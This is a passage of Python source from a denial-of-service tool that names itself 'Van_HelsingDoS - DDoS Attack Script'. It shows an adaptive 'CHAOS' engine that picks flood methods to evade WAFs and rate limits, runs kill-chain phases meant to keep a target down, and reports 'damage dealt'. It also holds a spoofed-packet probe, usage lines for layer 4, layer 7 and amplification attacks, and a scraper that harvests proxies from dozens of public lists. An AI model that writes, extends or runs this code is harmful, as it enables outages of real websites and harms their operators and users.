        if "firewall_rule" in rules or "rule_block" in rules:
            # Specific firewall rules. Shift away from blocked patterns entirely
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["DYN"] = max(weights.get("DYN", 0), 35)
            weights["COOKIE"] = max(weights.get("COOKIE", 0), 25)
        
        # === STRATEGY T: Adaptive RPC Application ===
        # Apply learned optimal requests-per-connection to avoid detection
        adaptive_rpc = intel.get("adaptive_rpc", 10)
        if adaptive_rpc < 5:
            # Very restricted. Only stealth methods can handle low RPC
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 60)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 40)
        
        # === STRATEGY U: Cookie Trust Exploitation ===
        # If we've harvested cookies, our requests have higher trust
        if intel.get("harvested_cookies"):
            # Cookies make all methods more effective
            weights["COOKIE"] = max(weights.get("COOKIE", 0), 30)
            weights["POST_DYN"] = int(weights.get("POST_DYN", 0) * 1.2)
            weights["DYN"] = int(weights.get("DYN", 0) * 1.2)
        
        # === STRATEGY Q: Cache Bypass Intelligence ===
        # If we've discovered uncached paths, boost POST/DYN methods that use them
        uncached = intel.get("uncached_paths", [])
        cached = intel.get("cached_paths", [])
        if len(uncached) > len(cached):
            # We have good cache-busting paths. Boost methods that use dynamic paths
            weights["DYN"] = max(weights.get("DYN", 0), 30)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 35)
        elif len(cached) > 3 and not uncached:
            # Everything is cached. GET is useless. Shift to POST-heavy
            weights["GET"] = max(weights["GET"] // 3, 1)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["POST"] = max(weights.get("POST", 0), 25)
        
        # === STRATEGY R: Referer Trust Building ===
        # If we have a session journey, stealth methods become more effective
        if intel.get("referer_chain"):
            weights["STEALTH_JA3"] = int(weights.get("STEALTH_JA3", 0) * 1.2)
            weights["BOT"] = max(weights.get("BOT", 0), 15)
        
        # === STRATEGY N: Exploration Bonus ===
        # In early phases, give bonus weight to methods we haven't tried yet
        if intel.get("exploration_bonus") and phase in ("PROBE", "CALIBRATE"):
            tried = intel.get("methods_tried_count", {})
            for method_name in weights:
                if method_name not in tried and weights[method_name] > 0:
                    weights[method_name] = max(weights[method_name], 15)
            # Disable exploration after CALIBRATE
            if phase == "ASSAULT":
                intel["exploration_bonus"] = False
        
        # === STRATEGY X: Kill Chain Phase Strategy ===
        kc_phase = intel.get("kill_chain_phase", "PROBE")
        
        if kc_phase == "WEAKEN":
            # Objective: exhaust connections. Prioritize Slowloris + many connections
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 45)
            weights["GET"] = max(weights.get("GET", 0), 20)
            weights["COOKIE"] = max(weights.get("COOKIE", 0), 20)
            
        elif kc_phase == "BREACH":
            # Objective: concentrated force on weakpoint
            wp = intel.get("target_weakpoint")
            if wp and wp in weights:
                weights[wp] = int(weights[wp] * 2.5)
            # Also boost heavy methods
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 45)
            weights["STRESS"] = max(weights.get("STRESS", 0), 30)
            
        elif kc_phase == "OVERWHELM":
            # Objective: everything at maximum
            for m in weights:
                if weights[m] > 5:
                    weights[m] = int(weights[m] * 1.8)
                    
        elif kc_phase == "SUSTAIN_KILL":
            # Objective: minimum effort to keep target down
            for m in weights:
                weights[m] = max(weights[m] // 2, 1)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 40)
            weights["GET"] = max(weights.get("GET", 0), 15)
        
        # === STRATEGY Y: Recovery Counter-Strike ===
        if intel.get("recovery_detected") and intel.get("recovery_counter", 0) > 0:
            # Target has recovered before. Hit harder this time
            multiplier = 1.0 + (intel["recovery_counter"] * 0.3)
            wp = intel.get("target_weakpoint")
            if wp and wp in weights:
                weights[wp] = int(weights[wp] * multiplier)
            weights["STRESS"] = max(int(weights.get("STRESS", 0) * multiplier), 20)
            weights["POST_DYN"] = max(int(weights.get("POST_DYN", 0) * multiplier), 25)
        
        # === STRATEGY V: Genetic DNA Override ===
        # If we have evolved DNA from the genetic algorithm, blend it in
        dna = intel.get("current_dna")
        if dna and phase not in ("PROBE",):
            blend_factor = min(intel.get("generation", 0) / 10, 0.6)  # Max 60% DNA influence
            for method_name, dna_weight in dna.items():
                if method_name in weights:
                    # Blend: (1-factor)*planned + factor*evolved
                    weights[method_name] = int(weights[method_name] * (1 - blend_factor) + dna_weight * blend_factor)
        
        # === STRATEGY W: Rate Limit Awareness ===
        threshold = intel.get("rate_limit_threshold")
        if threshold is not None:
            if threshold < 8:
                # Very strict rate limit. Go maximum stealth
                weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 85)
                weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
                weights["STRESS"] = 0
                weights["PPS"] = 0
            elif threshold < 15:
                # Moderate rate limit. Balance stealth and power
                weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
                weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 25)
        
        # === FILTER: Remove unavailable methods ===
        if not HAS_TLS_CLIENT:
            weights["STEALTH_JA3"] = 0
        if not hasattr(self, '_cf_clearance') or not self._cf_clearance:
            if waf == "cloudflare":
                weights["BOT"] = max(weights.get("BOT", 0) // 2, 2)
        
        return weights
        
    def _chaos_learn(self, method_name, success, got_5xx=False):
        """Phase 5: Reinforcement Learning with sliding window memory + proxy affinity."""
        intel = self._chaos_intel
        
        # Sliding window: keep last 50 results per method
        if method_name not in intel["success_history"]:
            intel["success_history"][method_name] = []
        intel["success_history"][method_name].append(1 if success else 0)
        if len(intel["success_history"][method_name]) > 50:
            intel["success_history"][method_name] = intel["success_history"][method_name][-50:]
        
        # Track proxy-method affinity
        if hasattr(self, '_current_proxy_addr'):
            self._chaos_track_proxy_affinity(method_name, self._current_proxy_addr, success)
        
        # Track consecutive blocks for emergency mode
        if not success:
            intel["consecutive_block"] += 1
        else:
            intel["consecutive_block"] = 0
            
        # Track server health signals
        if got_5xx:
            intel["consecutive_5xx"] += 1
        else:
            intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
    
    def CHAOS(self):
        """[V15] Grandmaster Tactical AI - Self-evolving attack engine with persistent
        memory, wave-based attack rhythm, dynamic combo generation, temperature-controlled
        aggression, and 20+ pre-coded experience patterns across all major WAF/CMS combos."""
        
        intel = self._chaos_intel
        
        # Record attack start time
        if intel["attack_start_time"] == 0:
            intel["attack_start_time"] = time()
        
        # Phase -1: LOAD PREVIOUS MEMORY (first call only)
        if not intel.get("recon_done") and not intel.get("_memory_checked"):
            intel["_memory_checked"] = True
            self._chaos_load_memory()  # Load battle experience from previous attacks
        
        # Phase 0: CONTINUOUS INTELLIGENCE GATHERING
        self._chaos_health_pulse()            # Monitor if target is weakening
        self._chaos_detect_waf_adaptation()   # Detect if WAF is learning us
        wave_state = self._chaos_wave_control()  # Update attack wave rhythm
        
        # Phase 1: DEEP RECON (runs only once per target)
        self._chaos_recon()
        
        # Phase 1.5: SESSION BUILDING (run once after recon to build trust)
        if intel["total_executions"] == 1:
            self._chaos_simulate_session()
        
        # Phase 1.6: AUTO-TUNE attack rate
        if intel["total_executions"] % 10 == 0:
            self._chaos_adaptive_rate()
        
        # Phase 1.7: KILL CHAIN PROTOCOL
        kc_phase = self._chaos_kill_chain()
        
        # Phase 1.8: PREDICTIVE MODELING (every 30s via health pulse)
        if intel["total_executions"] % 30 == 0:
            ttd = self._chaos_predict_ttd()
        
        # Phase 1.9: GENETIC EVOLUTION (every 100 executions)
        self._chaos_evolve_weights()
        
        # Phase 1.10: HTTP METHOD DIVERSIFICATION (2% of the time)
        if randint(1, 50) == 1:
            self._chaos_http_method_expand()
        
        # Phase 1.8: RATE LIMIT PROBING (exec 50 only)
        self._chaos_probe_rate_limit()
        
        # Phase 1.9: MULTI-PATH QUEUE REFRESH (every 50 executions)
        if intel["total_executions"] % 50 == 0:
            self._chaos_multi_path_targeting()
            
        # Apply timing jitter (human-like random delay)
        jitter = intel.get("jitter_ms", 0)
        if jitter > 0:
            sleep(jitter / 1000.0)
        
        # Save learned intelligence periodically (every 500 executions)
        if intel["total_executions"] > 0 and intel["total_executions"] % 500 == 0:
            intel["saved_to_disk"] = False  # Allow resaving
            self._chaos_save_memory()
        
        # Inject decoy traffic every 15-25 executions to camouflage patterns
        intel["decoy_interval"] += 1
        if intel["decoy_interval"] >= randint(15, 25):
            intel["decoy_interval"] = 0
            self._chaos_decoy()
        
        # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
        weights = self._chaos_plan()
        
        # Phase 3: EXECUTE with intelligent method selection
        method_map = {
            "GET": self.GET, "POST": self.POST, "STRESS": self.STRESS,
            "PPS": self.PPS, "DYN": self.DYN, "POST_DYN": self.POST_DYN,
            "SLOW_V2": self.SLOW_V2, "XMLRPC_AMP": self.XMLRPC_AMP,
            "WP_SEARCH": self.WP_SEARCH, "BOT": self.BOT, "COOKIE": self.COOKIE,
        }
        if HAS_TLS_CLIENT:
            method_map["STEALTH_JA3"] = self.STEALTH_JA3
        
        chosen_name = "GET"  # Fallback
        
        # === DECISION TREE ===
        # Priority 0: During REST wave, only fire stealth/decoy
        if wave_state == "REST" and randint(1, 3) <= 2:
            rest_pool = ["STEALTH_JA3", "SLOW_V2", "BOT"]
            for rp in rest_pool:
                if rp in method_map and weights.get(rp, 0) > 0:
                    chosen_name = rp
                    break
        
        # Priority 1: Execute combo chain if one is queued
        if chosen_name == "GET" and intel.get("combo_queue"):
            combo_method = intel["combo_queue"].pop(0)
            if combo_method in method_map and weights.get(combo_method, 0) > 0:
                chosen_name = combo_method
            else:
                intel["combo_queue"] = []  # Abort invalid combo
                
        # Priority 1.5: Multi-path targeting (use queued path+method pair)
        if chosen_name == "GET" and intel.get("multi_path_queue"):
            mp_path, mp_method = intel["multi_path_queue"].pop(0)
            if mp_method in method_map and weights.get(mp_method, 0) > 0:
                chosen_name = mp_method
                # Override the target path temporarily for this method
                if hasattr(self, 'crawled_paths') and mp_path not in (self.crawled_paths or []):
                    if not hasattr(self, 'crawled_paths') or not self.crawled_paths:
                        self.crawled_paths = []
                    self.crawled_paths.insert(0, mp_path)
        
        # Priority 1.6: Try dynamic combo (generated from best performers)
        if chosen_name == "GET" and not intel.get("combo_queue") and intel["total_executions"] % randint(20, 30) == 0:
            dynamic_combo = self._chaos_build_dynamic_combo()
            if dynamic_combo:
                intel["combo_queue"] = dynamic_combo
                chosen_name = intel["combo_queue"].pop(0)
                if chosen_name not in method_map or weights.get(chosen_name, 0) <= 0:
                    chosen_name = "GET"
                
        # Priority 2: Emergency evasion - pick least-used method
        if chosen_name == "GET" and intel.get("emergency_evasion"):
            # Find method with fewest total attempts
            least_used = None
            least_count = float('inf')
            for name, w in weights.items():
                if w > 0 and name in method_map:
                    attempts = len(intel.get("success_history", {}).get(name, []))
                    if attempts < least_count:
                        least_count = attempts
                        least_used = name
            if least_used:
                chosen_name = least_used
                
        # Priority 3: Exploit known weakpoint (20% of the time in ASSAULT+ phases)
        if chosen_name == "GET" and intel.get("target_weakpoint") and intel["phase"] in ("ASSAULT", "FINISH"):
            if randint(1, 5) <= 1:  # 20% chance to exploit weakpoint directly
                wp = intel["target_weakpoint"]
                if wp in method_map and weights.get(wp, 0) > 0:
                    chosen_name = wp
        
        # Priority 4: Normal weighted roulette
        if chosen_name == "GET":
            active_pool = [(name, w) for name, w in weights.items() if w > 0 and name in method_map]
            total_weight = sum(w for _, w in active_pool)
            
            if total_weight > 0:
                r = randint(1, total_weight)
                upto = 0
                for name, weight in active_pool:
                    if upto + weight >= r:
                        chosen_name = name
                        break
                    upto += weight
        
        chosen_func = method_map.get(chosen_name, self.GET)
        
        # Update method tracking for anti-pattern
        intel["last_method"] = chosen_name
        if "last_3_methods" not in intel:
            intel["last_3_methods"] = []
        intel["last_3_methods"].append(chosen_name)
        if len(intel["last_3_methods"]) > 3:
            intel["last_3_methods"] = intel["last_3_methods"][-3:]
        
        intel["burst_counter"] += 1
        
        # Track exploration data
        if chosen_name not in intel.get("methods_tried_count", {}):
            intel["methods_tried_count"][chosen_name] = 0
        intel["methods_tried_count"][chosen_name] += 1
        
        # Track pre-execution state for observation
        pre_burned = len(BURNED_PROXIES)
        pre_errors = int(ERROR_COUNT)
        pre_requests = int(REQUESTS_SENT)
        
        # Execute the chosen attack vector
        try:
            chosen_func()
            
            # Phase 4: OBSERVE outcomes
            post_burned = len(BURNED_PROXIES)
            post_errors = int(ERROR_COUNT)
            post_requests = int(REQUESTS_SENT)
            
            got_blocked = post_burned > pre_burned
            got_errors = post_errors > pre_errors + 2
            got_5xx = False
            if post_requests == pre_requests and post_errors > pre_errors:
                got_5xx = True
            
            # Phase 5: ADAPT with reinforcement learning
            if got_blocked or got_errors:
                self._chaos_learn(chosen_name, False, got_5xx)
                # Phase 6: RETRY ESCALATION - If method failed, try stronger variant
                if got_blocked and intel["phase"] in ("ASSAULT", "FINISH"):
                    self._chaos_retry_escalate(chosen_name, method_map)
            else:
                self._chaos_learn(chosen_name, True, got_5xx)
                
            # Periodic status report (every 200 executions)
            if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
                elapsed = int(time() - intel["attack_start_time"])
                
                # Target health indicator
                if intel.get("target_is_down"):
                    health_indicator = f"{bcolors.OKGREEN}DOWN - TARGET ELIMINATED{bcolors.RESET}"
                elif intel.get("target_getting_weaker"):
                    health_indicator = f"{bcolors.WARNING}WEAKENING - Keep pressure{bcolors.RESET}"
                else:
                    health_indicator = f"{bcolors.FAIL}HOLDING - Increase intensity{bcolors.RESET}"
                    
                # WAF status
                waf_status = f"{bcolors.FAIL}ADAPTING - Counter-measures active{bcolors.RESET}" if intel.get("waf_adapting") else f"{bcolors.OKGREEN}Stable{bcolors.RESET}"
                
                print(f"")
                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                print(f"{bcolors.OKCYAN}  [CHAOS V14 BATTLEGROUND STATUS]{bcolors.RESET}")
                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                kc = intel.get("kill_chain_phase", "?")
                kc_colors = {"RECON": bcolors.OKCYAN, "PROBE": bcolors.OKBLUE, "WEAKEN": bcolors.WARNING, 
                             "BREACH": bcolors.FAIL, "OVERWHELM": f"{bcolors.FAIL}{bcolors.BOLD}", "SUSTAIN_KILL": bcolors.OKGREEN}
                kc_color = kc_colors.get(kc, bcolors.RESET)
                print(f"  Kill Chain  : {kc_color}{kc}{bcolors.RESET} | Obj: {intel.get('kill_chain_objective', '...')[:50]}")
                print(f"  Phase       : {bcolors.BOLD}{intel['phase']}{bcolors.RESET} | Executed: {intel['total_executions']} | Time: {elapsed}s")
                # TTD Prediction
                ttd = intel.get("predicted_ttd")
                if ttd is not None:
                    if ttd < 60:
                        print(f"  Predicted   : {bcolors.OKGREEN}TARGET DOWN IN ~{ttd}s{bcolors.RESET}")
                    elif ttd < 300:
                        print(f"  Predicted   : {bcolors.WARNING}~{ttd//60}m {ttd%60}s to collapse{bcolors.RESET}")
                    else:
                        print(f"  Predicted   : {bcolors.FAIL}~{ttd//60}m to collapse (resilient target){bcolors.RESET}")
                slope = intel.get("latency_trend_slope", 0)
                if slope < -50:
                    print(f"  Recovery    : {bcolors.FAIL}TARGET RECOVERING! (slope: {int(slope)}){bcolors.RESET}")
                elif slope > 100:
                    print(f"  Trend       : {bcolors.OKGREEN}Latency rising fast (slope: +{int(slope)}){bcolors.RESET}")
                print(f"  Target HP   : {health_indicator}")
                print(f"  WAF Status  : {waf_status}")
                print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'Calibrating...')}{bcolors.RESET}")
                print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Scanning...')}{bcolors.RESET}")
                print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
                # Show response time trend
                hp = intel.get("health_history", [])
                if hp:
                    avg_rt = sum(hp[-5:]) / len(hp[-5:])
                    trend = "RISING" if len(hp) >= 2 and hp[-1] > hp[-2] else "STABLE"
                    print(f"  Latency     : {int(avg_rt)}ms ({trend})")
                eff_str = " | ".join([f"{k}:{v:.0%}" for k, v in sorted(intel.get("efficiency_score", {}).items(), key=lambda x: -x[1])[:5]])
                if eff_str:
                    print(f"  Efficiency  : {eff_str}")
                # Damage assessment
                dmg = self._chaos_calculate_damage() if hasattr(self, '_chaos_calculate_damage') else 0
                if dmg > 500:
                    dmg_str = f"{bcolors.OKGREEN}CRITICAL ({dmg}){bcolors.RESET}"
                elif dmg > 200:
                    dmg_str = f"{bcolors.WARNING}HEAVY ({dmg}){bcolors.RESET}"
                elif dmg > 50:
                    dmg_str = f"{bcolors.OKCYAN}MODERATE ({dmg}){bcolors.RESET}"
                else:
                    dmg_str = f"LIGHT ({dmg})"
                print(f"  Damage Dealt: {dmg_str}")
                print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                # Show WAF rules detected
                rules = intel.get("waf_rules_triggered", [])
                if rules:
                    print(f"  WAF Rules   : {bcolors.FAIL}{', '.join(rules[:5])}{bcolors.RESET}")
                cookies_count = len(intel.get("harvested_cookies", {}))
                if cookies_count:
                    print(f"  Cookies     : {cookies_count} harvested (trust level: HIGH)")
                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                print(f"")
                
        except Exception:
            self._chaos_learn(chosen_name, False)
        
        # Auto-save memory every 500 executions
        if intel["total_executions"] % 500 == 0 and intel["total_executions"] > 0:
            self._chaos_save_memory()


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkSpoofing():
        # [PHASE 4] Advanced BCP38 Detection Probe
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_RAW) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                # Build dummy raw packet with spoofed source 1.2.3.4
                packet = b'E\x00\x00(\x00\x00\x00\x00@\x06\x00\x00\x01\x02\x03\x04\x08\x08\x08\x08'
                s.sendto(packet, ('8.8.8.8', 80))
            return True
        except PermissionError:
            return False
        except OSError as e:
            # Operation not permitted or Network Unreachable for spoofed IP
            return False
        except: return False

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Received %s\n"
                             "Packets Sent %s\n"
                             "Packets Received %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                            exit(-1)
                        if "/" not in domain: continue
                        logger.info("please wait ...")

                        with get(domain, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                        if r.status_code <= 500 else "OFFLINE"))

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* Van_HelsingDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    # [OPTIMIZED] Logic to Handle "No Proxy" Mode
    # If user passed '0' or 'None' as filename, we return None (Direct Attack)
    if str(proxy_li) in {"0", "None", "NONE", "none"}:
        return None

    if proxy_ty not in {4, 5, 1, 0, 6, 7}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6, 7]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if proxy_ty == 7: # [PHASE 7, 8 & 9] INDO-PROXY ARMAGEDDON (ULTIMATE EXPANSION)
        logger.info(f"{bcolors.OKCYAN}Activating MEGA-INDO-SCAVENGER: Hunting for EVERY available Indonesian IP...{bcolors.RESET}")
        sources = [
            # Standard Hubs
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=ID",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=ID",
            "https://www.proxy-list.download/api/v1/get?type=socks5&country=ID",
            "https://www.proxy-list.download/api/v1/get?type=https&country=ID",
            # Specialized ID Repos
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_country/ID.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_country/ID.txt",
            "https://raw.githubusercontent.com/yuc0/proxy-list/main/country/ID.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt", # Generic but large
            "https://raw.githubusercontent.com/Zloi-User/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/UrielChaves/File-Proxy/master/Socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://proxyspace.pro/socks5.txt",
            "https://proxyspace.pro/http.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
        ]
        scavenged_proxies = []
        for source in sources:
            try:
                with get(source, timeout=10) as r:
                    if r.status_code == 200:
                        lines = r.text.splitlines()
                        for line in lines:
                            if ":" in line:
                                try:
